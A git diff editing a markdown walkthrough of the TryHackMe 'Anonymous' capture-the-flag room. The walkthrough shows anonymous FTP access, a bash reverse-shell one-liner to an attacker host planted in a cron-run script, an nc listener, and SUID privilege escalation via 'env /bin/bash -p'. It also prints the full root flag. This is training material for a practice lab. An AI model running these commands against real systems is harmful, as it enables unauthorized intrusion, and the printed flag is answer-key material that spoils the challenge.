@@ -1,6 +1,5 @@
-# Room: Anonymous (*Not the hacking group*)
+# Room: [Anonymous](https://tryhackme.com/room/anonymous) (*Not the hacking group*) :wink:
 
-This CTF is available on [TryHackMe](https://tryhackme.com/room/anonymous)
 
 ## Basic Enum
 
@@ -41,8 +40,7 @@ SMB1 disabled -- no workgroup available
 
 ```
 
-There's a share on the user's computer.  What's it called?
-
+- There's a share on the user's computer. What's it called?
 **pics**
 
 > HINT: What's that log file doing there?... nc won't work the way you'd expect it to
@@ -63,7 +61,7 @@ ftp> ls
 
 ftp> mget *
 ```
-Let's have a look on those files.
+Let's cat each files: 
 
 ```shell
 cat clean.sh 
@@ -91,20 +89,23 @@ Running cleanup script:  nothing to delete
 cat to_do.txt        
 I really need to disable the anonymous login...it's really not safe
 ```
-Sure :smile: Let's have fun now and upload this simple script via ftp
+
+## Basic shell
+
+So let's have fun by uploading this reverse shell via ftp now:
 
 ```shell
 cat clean.sh
 
 #!/bin/bash
-bash -i >& /dev/tcp/<AttackerIp>/<Port_Number> 0>&1
+bash -i >& /dev/tcp/<AttackerIp>/4242 0>&1
 ```
 
-And on our side we just have to wait few seconds:
+And after few seconds we are in :
 
 ```shell
-rlwrap nc -nlvp <Port_Number>            
-listening on [any] <Port_Number> ...
+rlwrap nc -nlvp 4242
+listening on [any] 4242
 namelessone@anonymous:~$ 
 id
 uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
@@ -120,7 +121,7 @@ namelessone@anonymous:~$
 
 > HINT: This may require you to do some outside research
 
-Cool ! So as usual in this case, gtfobins comes in :point_left:
+Cool ! So as usual in this case, [gtfobins](https://gtfobins.github.io/) comes in :point_left:
 
 ```shell
 find / -perm -u=s 2>/dev/null
@@ -135,9 +136,19 @@ env /bin/bash -p
 bash-4.4# id
 uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
 cat /root/root.txt
-4d930091c31a622a7ed10f27999af363
+4d9<Redacted>363
 bash-4.4# 
 
 ```
 
-- root.txt:**4d930091c31a622a7ed10f27999af363**
+Houra :partying_face:
+
+<details>
+  <summary>Click to reveal the root flag!</summary>
+  
+  ```bash
+  cat /root/root.txt
+  4d930091c31a622a7ed10f27999af363
+  ```
+</details>
+ 
